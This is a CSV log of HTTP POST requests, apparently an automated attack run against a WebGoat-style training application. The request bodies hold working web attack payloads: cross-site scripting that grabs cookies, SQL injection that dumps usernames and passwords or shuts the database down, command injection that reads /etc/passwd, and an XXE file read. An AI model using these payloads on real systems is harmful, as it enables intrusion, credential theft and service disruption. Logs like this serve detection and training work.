_id,signature,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
17850329-dbfd-483d-b95a-87adde019e5e,981b6a65221a2a6fadd1b5eebf7a647a,14745,108.203.98.203,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:45.405805
5e53bb05-6ada-412e-aa4f-7efd1f2f06e2,0cc12b803399bc318fb5ef8a0198dd2a,279,214.105.178.140,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=Wp16I79I,200,2025-10-12T01:06:45.458068
a8638687-ace9-445c-9040-9d157b987146,85aee69c9ef21529118b81a7931f7fbe,307,50.59.167.163,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5735'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:06:45.515096
55190e37-5fdb-4314-99b3-ba6bd3246662,f7a1ca8b5f04b31535623dabe8f95193,367,210.148.131.11,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1283'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:06:45.790496
f1a5107d-180c-43d8-bfb5-4786eda6dc9e,5f9447587cf72e3f0cb71cd9a98d68c5,279,89.117.15.90,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=tRvHjAQ7,200,2025-10-12T01:06:45.807183
0f9faf23-a675-46c2-a707-b6cd4cf58dc6,678e171637e6ab4245fbd84a821c5f3a,14745,54.7.154.137,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:45.825007
42f01638-647b-4869-b5ed-c314ef05efcf,9c621293bda1640210c3a415b911527f,279,76.55.45.172,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=AX9v8Qh1,200,2025-10-12T01:06:45.875265
dc304896-5682-423f-b0b4-fc282c0b1516,2ec8f854a32526b9b65fd9674b7e0181,14745,91.1.169.9,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:45.935537
fe507f66-b32a-4f62-aed8-ac0f4f6bedfb,807781536cd2e419b7dc27a50f484fbb,14753,81.251.33.89,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'U7jERppA'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:07:36.744060
8885ab0b-eb31-4bdf-82ac-123dbe69a57f,e98957a64c67c88c57abda8cb2960352,279,109.198.202.3,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=Keo7Kzn7,200,2025-10-12T01:07:36.761012
b5d59d2e-788f-427e-82f3-ed6e82ebc3e5,205b7fcd80e5d05811ec94421cf6d2bd,14745,10.186.203.35,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:36.818705
25498344-2bde-406f-9a68-35835dc91aed,aa07eb01b6fc6bdf6e26e53935ec31e1,367,139.151.6.57,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5005'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:07:36.868466
b5e485e6-ab59-40ef-97cd-73cadfe18f97,6b8f6d5b5b7e8e9806e3c6f24e0cc554,14745,50.115.17.239,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:36.926818
0b93753f-bdd9-41e9-9fca-79b8fca195e9,a93cd69f4609a9ee3c66096a1b6bbf77,14753,121.93.132.230,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'jtzmn6fu'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:07:36.978513
a4c7b644-c5b0-475f-80ed-e3926c7b7bc7,556f6387b468006c747c752e48d1e51e,14745,169.108.79.49,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:36.984219
2d8d915b-3493-4541-9626-51303a9f15da,8b66ad718068f89197b3a8a4dae92087,273,216.58.3.158,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9114'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:07:37.034792
c899a549-60e5-405a-b6fd-c884e829fe4e,f771074149d6579186bf2270508eb479,279,164.204.127.230,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=ez2UPHWe,200,2025-10-12T01:07:37.105560
f94ac03e-e240-4828-a17c-02ab4204a758,af71a4b0323bbf5b03cca8aaddaa2cad,14745,59.182.123.218,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:37.164484
5dd102ef-f66f-4749-b0a5-7f30f1fa6bdf,73214a5f3e7b56cdd99297daf4bc6d8f,14745,41.74.205.161,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:37.214335
aee4c093-d333-484e-b9b0-68c02650cac4,0c5ec20a3e21d1308c7264e0c8eb5d46,367,200.152.51.27,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6229'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:07:37.265544
457acde7-132d-484c-a453-282b9fe4d451,249568c515445e23f2266da8b5958d74,14741,140.140.19.89,POST,service/restxml,HTTP/1.1,"<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE user [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><username>&xxe;</username></user>",404,2025-10-12T01:07:37.328110
6000f18f-c9dc-4f4f-83e8-09963e865b6b,4ff5d47aaf08a8bfcfbc61683a23f096,14745,122.220.173.134,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:37.337525
74749fc6-412a-4ddd-87e2-e9c654fe02b4,dfb41b06c432631e7c29e87d458bfbc5,14753,62.55.107.73,POST,cia/command-injection,HTTP/1.1,"[('_uid', '6pCSDrmM'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:07:37.388973
19581844-6d53-4ca6-ba91-50cb33c0eb09,ebe18a3a770375089b36576e73202732,14745,91.40.159.14,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:37.401229
7d545d76-38a6-4c35-8437-cc1f72db3cf1,4ce16b2cf7d3199718431fdf99c59359,14745,39.109.163.233,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:37.449870
63f06f42-5dcb-4b0f-a618-c008a7905e5f,ef729a04db46a881301be99868e769cf,14745,44.73.67.164,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:37.508416
6728f3d3-78b4-4de1-bb7a-6c71b2884d62,5a468795718adebe4f1af05c79c81749,279,22.148.216.187,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=9175xnXh,200,2025-10-12T01:07:37.554291
71518a28-5861-41e1-aae1-a228c257f383,d32e683e357b76e3b1f0c8eca279b5ec,279,4.35.241.49,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=m0weGqjz,200,2025-10-12T01:07:37.607911
e5cd54a9-f933-4289-b3af-c4f9b02b3ecd,ff73504295c76e8d601f035e4b76dab1,279,223.174.131.224,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=7kmVDiEd,200,2025-10-12T01:07:37.664627
21d9f8b5-3d1e-4e71-a7ab-ea921371513d,ab71f893a4dc0c73b2fd9ef171f1a5af,307,56.149.149.201,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7248'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:07:37.716733
d3885239-bd6c-4deb-bb6e-f6a1e58df4a9,23716835717c522feff4920a037a48c5,279,141.221.136.76,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=Gpv0EWo2,200,2025-10-12T01:07:37.934701
309f8a75-e6cd-4459-9109-3e6454d0a582,afbd9e79cb84a0bab6ea3c6f8e56d2e3,14745,222.9.10.109,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:37.945136
2cd0b161-8009-4c09-9431-11001a49c020,4c0956003cd73d3adb8ebf230a019a0c,14745,107.52.183.38,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:37.989911
3e6158b7-3705-49d2-b749-313a6fb24758,82ace4096b6db4e00bcd737fe7a40277,14745,70.243.129.158,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:38.038891
c86749ae-ca79-41d8-a119-8709a2c850e1,ff8b24f6da7d2c79591541edbe166f42,279,201.28.86.10,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=xnnRzo7i,200,2025-10-12T01:07:38.087426
1dfa1fae-862b-4136-9f66-348e378a3c98,7ccfda27c29811b33a3d6e8c6d2c444a,14753,2.180.238.201,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'RTmZhZGT'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:07:38.154819
44fe33c7-a620-42fe-ad18-e9cb911cacb7,246aa09f0402e15dd29ecdcabc640530,14753,181.225.170.91,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'Iz0jAvce'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:07:38.158552
72c7216a-2512-4428-b4ac-397c664a01a3,0968e5abcb3a3dea6d31ae21a03cd80f,14753,133.53.209.250,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'V30cXKDe'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:07:38.164496
de86f9bf-6bd2-4dcd-a4ff-736c6b253817,61a91bcdc3c0c4df226f574b0eee1bf9,14753,38.92.250.68,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'UIxi2Jlx'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:07:38.171107
14bd72f0-be05-4ba8-983f-5adc550ccafb,74e659e85cfa88e8b6c6b21c22137100,14753,77.181.6.61,POST,cia/command-injection,HTTP/1.1,"[('_uid', '8yuhJkpc'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:07:38.174971
94bbfa30-1d1a-4818-82b0-fee7261e26ad,84aab9922743f345b87e884808554b04,279,117.150.79.17,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=X5Lh9B6u,200,2025-10-12T01:07:38.182130
dac08009-b9ac-45df-89c1-18399b05571e,3d88d2f66d7f292025f285122ac242e6,273,198.15.92.225,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6685'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:07:38.237298
28d83655-bc7f-46f0-a56f-029ca096e70d,da9111ff96f42cd2a1ca7246c4181d83,14745,100.222.228.37,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:38.293072
1ac7716b-dda4-4322-8830-413aac9a3628,6bd52c1633ab125bf9fa46cf76de4091,14753,115.160.224.249,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'g1wRHAPJ'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:07:38.339052
2f2ae0ed-f1ad-41f9-b039-df8dbf81aeee,bfb0b351a61694f2f476ec772f196fab,273,169.227.199.170,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7474'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:07:38.344505
788e1c53-43df-4cdb-a8ea-d8c2859b116f,06d8506e23611e3d7b19b1e8b3a43bb5,273,36.94.110.229,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2596'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:07:38.405173
910d1634-6632-449f-9777-fbad6d408797,60aff96e2d42d23acbe76fa8d5066999,307,118.184.168.185,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6621'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:07:38.468265
127fcc4f-0af3-462d-87ef-101878e495f3,6c54f80729e0ae357a23cab3859a3c13,14745,124.143.104.79,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:38.689687
19387781-8dcb-419c-8f0d-56ec5179e855,d04472473e55f2cedd5619d936273f24,279,21.1.219.206,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=Z5sQXltq,200,2025-10-12T01:07:38.696790
b0844a70-744e-4223-b238-22663363cd30,87565e734eea995aff08c4c0f37b1180,14753,83.18.62.29,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'Y9vQWdKk'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:07:38.747573
2d067543-b693-4dd3-a57b-5742a6ade154,2bc6d8e7af15adfa6cc371962994903a,273,139.139.26.8,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3102'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:07:38.754419
6100485f-6089-44c1-b084-8c0dcb3285d3,4ad67bc79e781d3fdc7bde2d886fde5a,14753,162.75.112.226,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'uKCEXtbo'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:07:38.810945
ce085fc7-12aa-4d3e-8907-1554a865815b,8b1c8a8280fd05137abd2d65abd5c7a6,279,182.237.7.81,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=1GeEenc0,200,2025-10-12T01:07:38.817957
7486889a-d4b4-4380-996c-0dcfdc4e9782,caaf2a1531dacde622ae128b9e4d747f,14745,113.90.28.164,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:38.874240
1533b966-b416-4f62-aacd-a090a9b8a10e,90e3eda8ca8152c5e5bf54b345030210,367,108.204.117.114,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4996'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:07:38.924953
2ade3e28-5865-4c91-af92-7921e153eebe,1d96de17b77f5deed12d992a3f5ca0e9,279,173.55.105.34,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=syEUBo5U,200,2025-10-12T01:07:38.979719
ad784552-b66a-4e40-a9f4-c21893742a70,4ab69452037eb9545616ebd48df35b3e,14745,69.173.19.100,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:39.030583
e8c77010-ee27-4b23-8883-f4cd8828d11f,47777e018afd051a883206dbc23f7662,279,28.55.79.111,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=nMVZiXL3,200,2025-10-12T01:07:39.080817
808e388b-ad1e-4f0b-9bac-12efb13a17b8,7c84a81bb3c6e62132e4d300a3fa658f,279,63.87.158.139,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=vi8TjKnG,200,2025-10-12T01:07:39.132977
5bd8138d-26b1-4e8e-ab31-550c657dd729,23d0d57969c6cbc00a7106a6597eece8,279,152.221.49.138,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=N69jt45o,200,2025-10-12T01:07:39.185140
1d3077c8-790c-4b2a-abfa-8e2d55a0bd14,3dd0520a231abba0c7d42aee67756de0,307,20.175.233.95,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3129'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:07:39.240092
fe11e4ae-40fc-4cfb-89b9-dcb1326a9334,e40cf21cf3c3ef33227502200fdd67b6,14753,126.198.81.33,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'WM4SJKym'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:07:39.463425
69d5e0bd-84c6-400c-b3dc-d085d6bd5317,acf932358b036a4613a960eec821a1c2,14745,155.153.86.142,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:39.470016
58a80872-1b07-4813-b153-d10fdf2954e1,8dfe6f2b30f1ab23f4b6c2363e2d7a2b,367,21.177.69.95,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5135'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:07:39.521090
39bc2118-180e-4d25-be19-dc7038dac6cc,c1b1c9e3a9495a5eb47897d829458737,273,98.221.70.64,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4360'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:07:39.588160
b4fe985c-ae25-4996-a122-1cb0bbd22962,b10148dfb1c839f74eb9c7d2bfa1b56f,14745,58.99.229.39,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:39.645419
5cfc1134-26dd-4873-be45-a158bdf3dde9,463c0cf8531b9f4bd1e1455bc1cadd1b,14745,11.42.92.137,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:39.693332
3c0b8834-c4af-4753-8006-641ec19d2b79,769f665a5253a4f6e11b1127e394f1dc,279,51.246.233.121,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=btR68aSF,200,2025-10-12T01:07:39.739776
ca605b9d-39aa-4386-9b60-c5d865603139,6d92c17982fecca5a2d293d1c73daa3b,14753,53.234.232.130,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'AUyc8f18'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:07:39.810004
ee71f2bb-f042-4994-8e5b-c54e3a954510,0e502f050063c269c834e79c97c5c5d6,14753,205.208.227.9,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'S7JEcaMG'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:07:39.818322
799835db-ca2d-4be2-85c0-5380362bc3f1,2b746353976d3ae2fa82b9da838ec621,14753,203.96.143.210,POST,cia/command-injection,HTTP/1.1,"[('_uid', '7G7ZkbUq'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:07:39.824296
3a69deb7-b18f-4136-b532-ba264b95bed7,7c582f57cfd768fe56aa8e7327358733,14745,150.73.4.112,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:39.869176
ee87d055-ecae-440b-b78b-5d3b6765d16b,b1740f7b1b86a8c8f6f917335539ebc2,367,22.203.108.52,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7146'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:07:39.922851
c347e17b-2f7d-45e1-9ded-61b9b1c9252d,8a551b11f89033b339ddba9eaf72f777,279,11.19.210.147,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=N9verKrP,200,2025-10-12T01:07:39.995093
a8cfd656-8d3a-4655-9a87-d762a8c63e97,dd677903aaebd77537079d57adc192af,279,86.114.110.93,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=tBvO4x2S,200,2025-10-12T01:07:40.050109
c2a1a519-0702-4a86-9507-cd41978eb578,6883ab77bb71bb7eb8ea228eb6f16298,14753,139.198.168.171,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'LJKI0dnS'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:07:40.107502
093fe4b3-e621-46a7-9b96-63f484c7b0f2,b6c8e75935538a0ee080f71f48262da3,279,204.157.212.226,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=fDRav6Dm,200,2025-10-12T01:07:40.114205
8cd53eda-1b1b-422e-901f-464503ee3286,b195f5fc4c159948d8dec30f919c5cc7,14753,206.69.8.19,POST,cia/command-injection,HTTP/1.1,"[('_uid', '4QfmM1us'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:07:40.170413
610f103a-3bfc-4359-9cce-67579e804891,150120292a554fd258aaa4608e363d1b,279,194.61.80.107,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=rRpIRR8Z,200,2025-10-12T01:07:40.176415
87e8831c-4f4a-4710-a58e-a62cec2d7685,db458bb262952daf5838341e3318c390,279,203.107.35.245,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=6zb5MfsO,200,2025-10-12T01:07:40.230397
39507e08-562c-4faa-b9b3-36454dd35656,5439408dbea39310846080952123e2b3,14745,183.43.159.110,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:40.286242
ff6b48d5-686c-4f12-988d-c3c7737adfc1,5f7a68e3717a9848cec534014e5b84bc,14745,11.124.133.172,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:40.336965
b3f6dd0e-5465-49b4-9e1e-368d950a7113,94ac3ef8fc5347d5f8b6d0d0ce76ac5d,279,221.73.240.82,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=T9Q4TugO,200,2025-10-12T01:07:40.386757
0b79040d-ed3b-49f1-ad46-196729a9e4ad,9962c105583772649f50b0b557e5811c,14753,133.140.128.14,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'VZ0plU72'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:07:40.459624
c78a4693-e5cf-40c0-816c-4ebd00361e11,a4bcc12b30d893e7279fe170128fbf21,14745,87.170.69.175,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:40.466403
dd5788c9-e48b-4cf5-97f8-8c32c90b307e,3ef42f2b67a5e0e4f80beb83a6c69f8a,307,113.9.144.147,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9237'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:07:40.514962
aeec1747-81b1-4d1c-8ebf-88b9c50a2fab,0260beb60cc8bdd8b06b1f6792fd5d31,273,101.33.241.152,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4246'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:07:40.748031
6d1a92d6-d12e-4a73-9ed6-1c290542d8f9,138c0b5ab2251b3ec1c0cc2898362ac3,14745,174.8.122.157,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:40.767316
4b260480-fa0c-443b-8a70-f95febead577,93992220a8bde269d831a496803f8e8e,279,153.128.241.84,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=4eqO8zQu,200,2025-10-12T01:07:40.817375
389a6d4d-3892-48ed-ad3e-000fdaf16a92,8f417b96a8647fbd3c68bb74cd6e5188,273,160.41.244.26,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7225'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:07:40.877170
21f5d16a-a24e-4b9d-ba6e-f87f439c230e,5dc9520bf012e0dd42446a6967331561,279,10.53.207.251,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=p211PQST,200,2025-10-12T01:07:40.937407
64306a3e-fa53-43f9-a1f2-82af589e2045,3de85acdb056b1350806e5f5afaa6151,279,47.77.183.224,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=mIjv3vV3,200,2025-10-12T01:07:40.993555
29411c78-aef7-4fab-8cf5-336a09167f0f,9282e72da8a3fe0ffed229245535d717,307,111.90.166.205,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6187'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:07:41.048367
e69f0edc-9e70-451a-b2b8-4311655c8d7f,3885fb4d0d21181c709591e1f7eacee8,14753,199.173.201.157,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'mlOFrf5s'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:07:41.267367
49ccb9b1-869d-4bb7-83dd-c75e1ed67d13,fdcd316001a4bf18dcb73a23189c950e,14753,56.36.115.201,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'V6sFpACb'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:07:41.274254
25047c7d-2fec-4941-a25a-27c9b5c9cc7f,37affde5abf2bb3d127bb4d211db019f,307,18.250.76.177,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8190'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:07:41.280313
b4939af8-ff38-419f-a492-2e76488fdfe4,a323c17e8daf336bcac7a215d56022f7,367,4.20.21.176,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4695'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:07:41.500503
e5dd83b4-2c63-479b-ae16-c8856ee23280,08cc22b46d003c512773048d6bd6f842,14745,81.37.11.128,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:41.517303
9045090d-c41e-4c1b-a9a5-1cfa1b8653a9,0a226789eab5121a8072226cc74916bc,14745,35.216.108.212,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:41.572043
c04f7bbf-a962-4165-867f-05b6e81bdb67,58ae2a0c7b5e195c80ed3a02b763f74f,279,26.239.243.235,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=I3Dzawxq,200,2025-10-12T01:07:41.621768
4b67c73f-5c99-4cbc-a0ca-8d385e0d664f,748a53f559a0f5656dae086e1e2c48b7,273,176.249.223.247,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8821'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:07:41.687834
8540d166-a64d-4db0-b018-fa22bfd0ca91,da8e92e07ec486d2b38545bf50f475cf,14745,56.220.134.35,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:07:41.747831
1ba98e34-4837-4806-ab9e-1369b5f4db8b,730ea106e3c6a1ef1dcfb59a70758a0b,14753,75.49.128.204,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'ERNyVMy3'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:07:41.796565
624e337b-15ff-468d-bf88-5e2bfb14210a,8d274285ee1cfbbf06f124128be9e64e,14753,189.51.178.19,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'ZyXOlnvO'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:07:41.803345
a9ec8cf8-c78c-44f7-ba57-19022f44633b,64360b84c8c0471cf8d798b918c655a0,279,4.68.92.243,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=L4RwuJNC,200,2025-10-12T01:07:41.807657
f30aee85-9c1b-4a0e-8f87-c5e5417e41e5,bfdc7c9dfd2f11fa33d33a13f32027c1,279,10.236.255.176,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=ma12szwZ,200,2025-10-12T01:07:41.879229
0556d630-8723-4b81-b196-5bb10fc2c232,bed020e27a34abf586d6f54b6fd66c18,279,39.243.42.214,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=OVrpDZjq,200,2025-10-12T01:07:41.895251
